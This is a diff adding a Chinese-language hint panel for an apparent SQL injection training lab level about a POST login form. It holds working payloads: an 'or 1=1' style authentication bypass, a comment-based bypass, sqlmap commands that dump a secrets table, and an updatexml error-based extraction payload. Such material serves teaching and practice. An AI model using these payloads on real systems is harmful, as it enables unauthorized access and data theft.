@@ -1,0 +1,18 @@
+<div class="hint-thought">
+<h4>思路提示</h4>
+<p>POST 型注入和 GET 原理一样，只是参数在请求体里。本关有两个目标：① 万能密码登录——利用 SQL 语句拼接，用 <code>or '1'='1</code> 让条件恒真，或用 <code>#</code> 注释掉密码判断；② 进阶用 Burp 抓包后用 sqlmap 跑 POST 请求。重点观察页面回显的拼接后 SQL，理解注释符的作用。</p>
+</div>
+<details class="hint-detail">
+<summary>详细解题过程（点击展开）</summary>
+<div>
+<b>万能密码（目标1）：</b><br>
+用户名：<code>admin' or '1'='1</code> 密码随意<br>
+或用户名：<code>admin' #</code>（# 注释掉后面的密码判断）<br>
+<b>观察：</b>页面会回显拼接后的 SQL，理解 # 注释的作用。<br>
+<b>sqlmap（目标2）：</b><br>
+1. Burp 抓到登录 POST 请求，右键 Save item 存为 post.txt<br>
+2. <code>sqlmap -r post.txt -p username --dbs</code><br>
+3. <code>sqlmap -r post.txt -p username -D bafanglab -T secrets --dump</code><br>
+<b>进阶：</b>试试报错注入 <code>admin' and updatexml(1,concat(0x7e,(select group_concat(secret) from secrets)),1) #</code>
+</div>
+</details>
